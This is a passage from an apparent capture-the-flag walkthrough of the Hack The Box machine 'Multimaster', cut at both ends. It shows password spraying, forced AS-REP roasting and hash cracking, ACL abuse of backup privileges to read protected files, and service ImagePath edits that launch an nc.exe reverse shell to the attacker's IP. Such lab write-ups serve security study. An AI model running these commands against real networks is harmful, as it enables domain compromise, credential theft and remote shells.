+</pre></table></code></div></div><blockquote><p>We’re sorry but multimaster doesn’t work properly without JavaScript enabled. Please enable it to continue.</p></blockquote><p><a href="https://superuser.com/questions/815527/way-to-list-and-cat-all-files-that-contain-string-x-in-powershell">https://superuser.com/questions/815527/way-to-list-and-cat-all-files-that-contain-string-x-in-powershell</a> <code class="language-plaintext highlighter-rouge">ls -R|?{$_|Select-String 'dummy'}|%{$_.FullName;gc $_}</code></p><p>Running the command <code class="language-plaintext highlighter-rouge">*Evil-WinRM* PS C:\inetpub\wwwroot\bin&gt; type MultimasterAPI.dll</code> results in:</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre>IndexDefaultApi+api/{controller}/{id}%/api/getColleagues
+                                                             UNION
+SELECT  JOINALL EXEC'
+                     ORDER--#WAITFOR
+                                    DELAY       FROM
+                                                    WHEREANDOR&amp;&amp;        LIKESYS%INFORMATION_SCHEMA
+MASTER7{ "info" : "MegaCorp API" }!application/json€…server=localhost;database=Hub_DB;uid=finder;password=D3veL0pM3nT!; nameaSelect * from Colleagues where name like '%{0}%'idposition
+                                                                               email
+                                                                                    image
+</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">ls -R -EA SilentlyContinue|?{$_|Select-String 'password'}|%{$_.FullName;}</code></p><h3 id="moving-laterally-to-user3---sbauer">Moving laterally to user3 - <code class="language-plaintext highlighter-rouge">sbauer</code></h3><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre>zweilos@kalimaa:~/htb/multimaster$ crackmapexec smb -u users -p passwords -d MEGACORP 10.10.10.179
+SMB         10.10.10.179    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP) (signing:True) (SMBv1:True)
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\shayna:password1 STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\shayna:finance1 STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\shayna:banking1 STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\shayna:D3veL0pM3nT! STATUS_LOGON_FAILURE
+
+...snipped...
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\sbauer:password1 STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\sbauer:finance1 STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\sbauer:banking1 STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [+] MEGACORP\sbauer:D3veL0pM3nT!
+</pre></table></code></div></div><p>I found a password for yet again another user: this time <code class="language-plaintext highlighter-rouge">sbauer</code>. Accordeing to my searches with Bloodhoud earlier, <code class="language-plaintext highlighter-rouge">jorden</code> should be next, then <code class="language-plaintext highlighter-rouge">Administrator</code>. we will see if my projected path from this user was correct.</p><blockquote><p>GenericWrite Generic Write access grants you the ability to <strong>write to any non-protected attribute on the target object</strong>, including “members” for a group, and “<strong>serviceprincipalnames</strong>” for a user Abuse Info Users With GenericWrite over a user, <strong>perform a targeted kerberoasting attack</strong>. See the abuse section under the GenericAll edge for more information</p></blockquote><p>The following video explains how to exploit this: <a href="https://www.youtube.com/watch?v=z8thoG7gPd0">https://www.youtube.com/watch?v=z8thoG7gPd0</a></p><p><a href="http://www.harmj0y.net/blog/activedirectory/targeted-kerberoasting/">http://www.harmj0y.net/blog/activedirectory/targeted-kerberoasting/</a></p><blockquote><p>we can change a victim’s userAccountControl to not require Kerberos preauthentication, grab the user’s crackable AS-REP, and then change the setting back:</p></blockquote><p><a href="https://docs.microsoft.com/en-us/powershell/module/addsadministration/set-adaccountcontrol?view=win10-ps">https://docs.microsoft.com/en-us/powershell/module/addsadministration/set-adaccountcontrol?view=win10-ps</a></p><p>Set-ADAccountControl -DoesNotRequirePreAuth</p><blockquote><p>-DoesNotRequirePreAuth Indicates whether Kerberos pre-authentication is required to logon using the user or computer account. This parameter sets the ADS_UF_DONT_REQUIRE_PREAUTH flag of the Active Directory UAC attribute. The acceptable values for this parameter are:</p><ul><li>$False or 0<li>$True or 1</ul></blockquote><p>Then we can use Impacket’s GETSPNUSers.py</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+</pre><td class="rouge-code"><pre>zweilos@kalimaa:~/htb/multimaster$ evil-winrm -u sbauer -i 10.10.10.179 -p D3veL0pM3nT!
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\sbauer\Documents&gt; whoami /all
+
+USER INFORMATION
+----------------
+
+User Name       SID
+=============== =============================================
+megacorp\sbauer S-1-5-21-3167813660-1240564177-918740779-3102
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID                                           Attributes
+=========================================== ================ ============================================= ==================================================
+Everyone                                    Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
+MEGACORP\Developers                         Group            S-1-5-21-3167813660-1240564177-918740779-3119 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+</pre></table></code></div></div><h3 id="moving-from-sbauer-to-jorden">Moving from <code class="language-plaintext highlighter-rouge">sbauer</code> to <code class="language-plaintext highlighter-rouge">jorden</code></h3><p><code class="language-plaintext highlighter-rouge">*Evil-WinRM* PS C:\inetpub&gt; Set-ADAccountControl -DoesNotRequirePreAuth $True jorden</code></p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+</pre><td class="rouge-code"><pre>zweilos@kalimaa:~/.local/bin$ python3 GetNPUsers.py -format hashcat -usersfile /home/zweilos/htb/multimaster/users -debug -dc-ip 10.10.10.179 MEGACORP/sbauer:D3veL0pM3nT!
+Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
+
+[+] Impacket Library Installation Path: /home/zweilos/.local/lib/python3.8/site-packages/impacket
+[+] Trying to connect to KDC at 10.10.10.179
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[+] Trying to connect to KDC at 10.10.10.179
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[+] Trying to connect to KDC at 10.10.10.179
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[+] Trying to connect to KDC at 10.10.10.179
+[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
+[+] Trying to connect to KDC at 10.10.10.179
+[-] User aldom doesn't have UF_DONT_REQUIRE_PREAUTH set
+[+] Trying to connect to KDC at 10.10.10.179
+[-] User alice doesn't have UF_DONT_REQUIRE_PREAUTH set
+[+] Trying to connect to KDC at 10.10.10.179
+[-] User alyx doesn't have UF_DONT_REQUIRE_PREAUTH set
+[+] Trying to connect to KDC at 10.10.10.179
+[-] User andrew doesn't have UF_DONT_REQUIRE_PREAUTH set
+[+] Trying to connect to KDC at 10.10.10.179
+[-] User ckane doesn't have UF_DONT_REQUIRE_PREAUTH set
+[+] Trying to connect to KDC at 10.10.10.179
+[-] User cyork doesn't have UF_DONT_REQUIRE_PREAUTH set
+[+] Trying to connect to KDC at 10.10.10.179
+[-] User dai doesn't have UF_DONT_REQUIRE_PREAUTH set
+[+] Trying to connect to KDC at 10.10.10.179
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[+] Trying to connect to KDC at 10.10.10.179
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[+] Trying to connect to KDC at 10.10.10.179
+[-] User ilee doesn't have UF_DONT_REQUIRE_PREAUTH set
+[+] Trying to connect to KDC at 10.10.10.179
+[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
+[+] Trying to connect to KDC at 10.10.10.179
+$krb5asrep$23$jorden@MEGACORP:1056ca13b19833bd5ae1152f9fe42b5c$112eb867bb4c8c06593c39d27e4ca1167692f7f061691c45cd1825291fd3ae9a7b8130e239d076b0f928fc42e7d683444cb8b3124d54711fbd72278e24cf75f5bd08351fc4b63e43ae9e5affac8b6b702eef582c720ed88855e6c9a6ac41ebe7b5b86fb4043f607a6d4a090022c471183e812d08501d49ae1d2f1c62d35816e95c98437d54e396a1b680b7836a6cad4c3af218d25187bd3ac4df45ffbc13359d7b952b7d841a89ac7a1c8c16ce5625dc03212af744371cb24c611c9ddf0da4c3de5740ea9cdaf09e113d23e9969d4107be3ecc2ceeed48f274f95e5d108ff504fe527ff86a71606d38f5
+[+] Trying to connect to KDC at 10.10.10.179
+[-] User jsmmons doesn't have UF_DONT_REQUIRE_PREAUTH set
+[+] Trying to connect to KDC at 10.10.10.179
+[-] User kpage doesn't have UF_DONT_REQUIRE_PREAUTH set
+[+] Trying to connect to KDC at 10.10.10.179
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[+] Trying to connect to KDC at 10.10.10.179
+[-] User lana doesn't have UF_DONT_REQUIRE_PREAUTH set
+[+] Trying to connect to KDC at 10.10.10.179
+[-] User nbourne doesn't have UF_DONT_REQUIRE_PREAUTH set
+[+] Trying to connect to KDC at 10.10.10.179
+[-] User okent doesn't have UF_DONT_REQUIRE_PREAUTH set
+[+] Trying to connect to KDC at 10.10.10.179
+[-] User pmartin doesn't have UF_DONT_REQUIRE_PREAUTH set
+[+] Trying to connect to KDC at 10.10.10.179
+[-] User rmartin doesn't have UF_DONT_REQUIRE_PREAUTH set
+[+] Trying to connect to KDC at 10.10.10.179
+[-] User sbauer doesn't have UF_DONT_REQUIRE_PREAUTH set
+[+] Trying to connect to KDC at 10.10.10.179
+[-] User svc-nas doesn't have UF_DONT_REQUIRE_PREAUTH set
+[+] Trying to connect to KDC at 10.10.10.179
+[-] User svc-sql doesn't have UF_DONT_REQUIRE_PREAUTH set
+[+] Trying to connect to KDC at 10.10.10.179
+[-] User tushikikatomo doesn't have UF_DONT_REQUIRE_PREAUTH set
+[+] Trying to connect to KDC at 10.10.10.179
+[-] User zac doesn't have UF_DONT_REQUIRE_PREAUTH set
+[+] Trying to connect to KDC at 10.10.10.179
+[-] User zpowers doesn't have UF_DONT_REQUIRE_PREAUTH set
+</pre></table></code></div></div><p>the password cracked very quickly</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+</pre><td class="rouge-code"><pre>zweilos@kalimaa:~/htb/multimaster$ hashcat -m 18200 -a 0 jorden.hash ~/rockyou.txt
+hashcat (v6.0.0) starting...
+Dictionary cache built:
+* Filename..: /home/zweilos/rockyou.txt
+* Passwords.: 14344391
+* Bytes.....: 139921506
+* Keyspace..: 14344384
+* Runtime...: 2 secs
+
+$krb5asrep$23$jorden@MEGACORP:1056ca13b19833bd5ae1152f9fe42b5c$112eb867bb4c8c06593c39d27e4ca1167692f7f061691c45cd1825291fd3ae9a7b8130e239d076b0f928fc42e7d683444cb8b3124d54711fbd72278e24cf75f5bd08351fc4b63e43ae9e5affac8b6b702eef582c720ed88855e6c9a6ac41ebe7b5b86fb4043f607a6d4a090022c471183e812d08501d49ae1d2f1c62d35816e95c98437d54e396a1b680b7836a6cad4c3af218d25187bd3ac4df45ffbc13359d7b952b7d841a89ac7a1c8c16ce5625dc03212af744371cb24c611c9ddf0da4c3de5740ea9cdaf09e113d23e9969d4107be3ecc2ceeed48f274f95e5d108ff504fe527ff86a71606d38f5:rainforest786
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: Kerberos 5, etype 23, AS-REP
+Hash.Target......: $krb5asrep$23$jorden@MEGACORP:1056ca13b19833bd5ae11...6d38f5
+Time.Started.....: Fri Jul 24 20:36:37 2020 (6 secs)
+Time.Estimated...: Fri Jul 24 20:36:43 2020 (0 secs)
+Guess.Base.......: File (/home/zweilos/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   740.8 kH/s (13.81ms) @ Accel:64 Loops:1 Thr:64 Vec:8
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 4407296/14344384 (30.72%)
+Rejected.........: 0/4407296 (0.00%)
+Restore.Point....: 4390912/14344384 (30.61%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: ramirez@7 -&gt; rageagaint
+
+Started: Fri Jul 24 20:36:14 2020
+Stopped: Fri Jul 24 20:36:44 2020
+</pre></table></code></div></div><p>the user <code class="language-plaintext highlighter-rouge">jorden</code>’s password was <code class="language-plaintext highlighter-rouge">rainforest786</code></p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Users\jorden\Documents&gt; whoami /all
+
+USER INFORMATION
+----------------
+
+User Name       SID
+=============== =============================================
+megacorp\jorden S-1-5-21-3167813660-1240564177-918740779-3110
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID                                           Attributes
+========================================== ================ ============================================= ==================================================
+Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Server Operators                   Alias            S-1-5-32-549                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
+MEGACORP\Developers                        Group            S-1-5-21-3167813660-1240564177-918740779-3119 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level       Label            S-1-16-12288
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                         State
+============================= =================================== =======
+SeMachineAccountPrivilege     Add workstations to domain          Enabled
+SeSystemtimePrivilege         Change the system time              Enabled
+SeBackupPrivilege             Back up files and directories       Enabled
+SeRestorePrivilege            Restore files and directories       Enabled
+SeShutdownPrivilege           Shut down the system                Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
+SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
+SeTimeZonePrivilege           Change the time zone                Enabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+</pre></table></code></div></div><p>This user has backup and restore privileges, which if I remember correctly is a quick and easy path to escalate privileges “This privilege causes the system to grant all read access control to any file (only read).”</p><p><a href="https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf">https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf</a></p><blockquote><p>If you have SeBackup&amp; SeRestoreprivileges(Backup Operators group) you can set permissio nand ownership on each file &amp; folder =WIN!</p></blockquote><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Users\jorden\Documents&gt; $user = MEGACORP\jorden
+The module 'MEGACORP' could not be loaded. For more information, run 'Import-Module MEGACORP'.
+At line:1 char:9
++ $user = MEGACORP\jorden
++         ~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (MEGACORP\jorden:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CouldNotAutoLoadModule
+*Evil-WinRM* PS C:\Users\jorden\Documents&gt; $user = 'MEGACORP\jorden'
+*Evil-WinRM* PS C:\Users\jorden\Documents&gt; cd c:\
+*Evil-WinRM* PS C:\&gt; ls
+
+
+    Directory: C:\
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        9/25/2019  12:41 PM                DFSRoots
+d-----         1/7/2020   7:23 PM                inetpub
+d-----        9/25/2019   5:01 AM                PerfLogs
+d-r---         1/9/2020   1:18 PM                Program Files
+d-----         1/9/2020   1:18 PM                Program Files (x86)
+d-r---         1/9/2020   5:14 PM                Users
+d-----         1/9/2020   2:39 PM                Windows
+
+
+*Evil-WinRM* PS C:\&gt; $folder = 'C:\Users\Administrator'
+*Evil-WinRM* PS C:\&gt; $acl = Get-ACL $folder
+*Evil-WinRM* PS C:\&gt; $aclperms = $user, "Full Control", "ContainerInherit, ObjectInherit","None","Allow"
+*Evil-WinRM* PS C:\&gt; $aclrule = New-Object System.Security.AccessControl.FileSystemAccessRule $aclperms
+Cannot convert argument "1", with value: "Full Control", for "FileSystemAccessRule" to type "System.Security.AccessControl.FileSystemRights": "Cannot convert value "Full Control" to type "System.Security.AccessControl.FileSystemRights". Error: "Unable to match the identifier name Full Control to a valid enumerator name. Specify one of the following enumerator names and try again:
+ListDirectory, ReadData, WriteData, CreateFiles, CreateDirectories, AppendData, ReadExtendedAttributes, WriteExtendedAttributes, Traverse, ExecuteFile, DeleteSubdirectoriesAndFiles, ReadAttributes, WriteAttributes, Write, Delete, ReadPermissions, Read, ReadAndExecute, Modify, ChangePermissions, TakeOwnership, Synchronize, FullControl""
+At line:1 char:12
++ $aclrule = New-Object System.Security.AccessControl.FileSystemAccessR ...
++            ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) [New-Object], MethodException
+    + FullyQualifiedErrorId : ConstructorInvokedThrowException,Microsoft.PowerShell.Commands.NewObjectCommand
+</pre></table></code></div></div><p>Make sure not to have any spaces between words in your command!</p><h3 id="roottxt">Root.txt</h3><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\&gt; $aclperms = $user, "FullControl", "ContainerInherit, ObjectInherit","None","Allow"
+*Evil-WinRM* PS C:\&gt; $aclrule = New-Object System.Security.AccessControl.FileSystemAccessRule $aclperms
+*Evil-WinRM* PS C:\&gt; $acl.AddAccessRule($aclrule)
+*Evil-WinRM* PS C:\&gt; Set-Acl -Path $folder -AclObject $acl
+*Evil-WinRM* PS C:\&gt; Get-Acl $folder | fl
+
+
+Path   : Microsoft.PowerShell.Core\FileSystem::C:\Users\Administrator
+Owner  : NT AUTHORITY\SYSTEM
+Group  : NT AUTHORITY\SYSTEM
+Access : NT AUTHORITY\SYSTEM Allow  FullControl
+         BUILTIN\Administrators Allow  FullControl
+         MEGACORP\Administrator Allow  FullControl
+         MEGACORP\jorden Allow  FullControl
+Audit  :
+Sddl   : O:SYG:SYD:PAI(A;OICI;FA;;;SY)(A;OICI;FA;;;BA)(A;OICI;FA;;;LA)(A;OICI;FA;;;S-1-5-21-3167813660-1240564177-918740779-3110)
+*Evil-WinRM* PS C:\&gt; cd C:\Users\Administrator
+*Evil-WinRM* PS C:\Users\Administrator&gt; ls
+
+
+    Directory: C:\Users\Administrator
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         1/9/2020   3:18 AM                .vscode
+d-r---         1/9/2020   2:45 PM                Contacts
+d-r---         1/9/2020   4:43 PM                Desktop
+d-r---         1/9/2020   4:35 PM                Documents
+d-r---         1/9/2020   2:45 PM                Downloads
+d-r---         1/9/2020   2:45 PM                Favorites
+d-r---         1/9/2020   2:45 PM                Links
+d-r---         1/9/2020   2:45 PM                Music
+d-r---         1/9/2020   2:45 PM                Pictures
+d-r---         1/9/2020   2:45 PM                Saved Games
+d-r---         1/9/2020   2:45 PM                Searches
+d-r---         1/9/2020   2:45 PM                Videos
+
+
+*Evil-WinRM* PS C:\Users\Administrator&gt; cd Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; ls
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        7/23/2020  10:08 PM             34 root.txt
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt
+fe237d93abd456b96a363e2ed34fb271
+</pre></table></code></div></div><h3 id="getting-administrator-shell">Getting Administrator Shell</h3><p>So now I have successfully exfiltrated the secret documents…but I want to own the system. Time to practice some more privilege escalation.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Users\jorden\Documents&gt; $folder = "C:\Windows\NTDS"
+*Evil-WinRM* PS C:\Users\jorden\Documents&gt; $acl = Get-ACL $folder
+*Evil-WinRM* PS C:\Users\jorden\Documents&gt; $user = "MEGACORP\jorden"
+*Evil-WinRM* PS C:\Users\jorden\Documents&gt; $aclperms = $user, "FullControl", "ContainerInherit, ObjectInherit","None","Allow"
+*Evil-WinRM* PS C:\Users\jorden\Documents&gt; $aclrule = New-Object System.Security.AccessControl.FileSystemAccessRule $aclperms
+*Evil-WinRM* PS C:\Users\jorden\Documents&gt; $acl.AddAccessRule($aclrule)
+*Evil-WinRM* PS C:\Users\jorden\Documents&gt; Set-Acl -Path $folder -AclObject $acl
+*Evil-WinRM* PS C:\Users\jorden\Documents&gt; Get-Acl $folder | fl
+
+Path   : Microsoft.PowerShell.Core\FileSystem::C:\Windows\NTDS
+Owner  : BUILTIN\Administrators
+Group  : MEGACORP\Domain Users
+Access : CREATOR OWNER Allow  268435456
+         NT AUTHORITY\SYSTEM Allow  268435456
+         NT AUTHORITY\SYSTEM Allow  FullControl
+         NT AUTHORITY\LOCAL SERVICE Allow  AppendData, Synchronize
+         BUILTIN\Administrators Allow  FullControl
+         BUILTIN\Administrators Allow  268435456
+         MEGACORP\jorden Allow  FullControl
+Audit  :
+Sddl   : O:BAG:DUD:PAI(A;OICIIO;GA;;;CO)(A;OICIIO;GA;;;SY)(A;;FA;;;SY)(A;CI;0x100004;;;LS)(A;;FA;;;BA)(A;OICIIO;GA;;;BA)(A;OICI;FA;;;S-1-5-21-3167813660-1240564177-918740779-3110)
+</pre></table></code></div></div><p>I’m sure there is a way I can backup ntds.dit From <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers">https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers</a>: But it seems like I need an admin prompt for this to work</p><p><a href="https://decoder.cloud/2018/02/12/the-power-of-backup-operatos/">https://decoder.cloud/2018/02/12/the-power-of-backup-operatos/</a></p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>REG add HKLM\System\CurrentControlSet\Services\WpnUserService_64360ac /v ImagePath /t REG_EXPAND_SZ /d "cmd.exe /c C:\Users\jorden\Documents\nc.exe 10.10.15.57 12345 -e cmd.exe" /f
+</pre></table></code></div></div><p>Upload nc.exe, then start the service with <code class="language-plaintext highlighter-rouge">sc.exe start &lt;service&gt;</code>.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Users\jorden\Documents&gt; sc.exe start WerSvc
+[SC] StartService FAILED 1053:
+
+The service did not respond to the start or control request in a timely fashion.
+
+*Evil-WinRM* PS C:\Users\jorden\Documents&gt; REG add HKLM\System\CurrentControlSet\Services\Wecsvc /v ImagePath /t REG_EXPAND_SZ /d "cmd.exe /c C:\Users\jorden\Documents\nc.exe 10.10.15.57 12345 -e cmd.exe" /f
+The operation completed successfully.
+
+*Evil-WinRM* PS C:\Users\jorden\Documents&gt; sc.exe start Wecsvc
+[SC] StartService FAILED 1053:
+
+The service did not respond to the start or control request in a timely fashion.
+
+*Evil-WinRM* PS C:\Users\jorden\Documents&gt; REG add HKLM\System\CurrentControlSet\Services\wbengine /v ImagePath /t REG_EXPAND_SZ /d "cmd.exe /c C:\Users\jorden\Documents\nc.exe 10.10.15.57 12345 -e cmd.exe" /f
+The operation completed successfully.
+
+*Evil-WinRM* PS C:\Users\jorden\Documents&gt; sc.exe start wbengine
+[SC] StartService: OpenService FAILED 1060:
+
+The specified service does not exist as an installed service.
+
+*Evil-WinRM* PS C:\Users\jorden\Documents&gt; REG add HKLM\System\CurrentControlSet\Services\VSS /v ImagePath /t REG_EXPAND_SZ /d "cmd.exe /c C:\Users\jorden\Documents\nc.exe 10.10.15.57 12345 -e cmd.exe" /fThe operation completed successfully.
+
+*Evil-WinRM* PS C:\Users\jorden\Documents&gt; sc.exe start VSS
+[SC] StartService FAILED 1053:
+
+The service did not respond to the start or control request in a timely fashion.*Evil-WinRM* PS C:\Users\jorden\Documents&gt; sc.exe start WerSvc
+[SC] StartService FAILED 1053:
+
+The service did not respond to the start or control request in a timely fashion.
+
+*Evil-WinRM* PS C:\Users\jorden\Documents&gt; REG add HKLM\System\CurrentControlSet\Services\Wecsvc /v ImagePath /t REG_EXPAND_SZ /d "cmd.exe /c C:\Users\jorden\Documents\nc.exe 10.10.15.57 12345 -e cmd.exe" /f
+The operation completed successfully.
+
+*Evil-WinRM* PS C:\Users\jorden\Documents&gt; sc.exe start Wecsvc
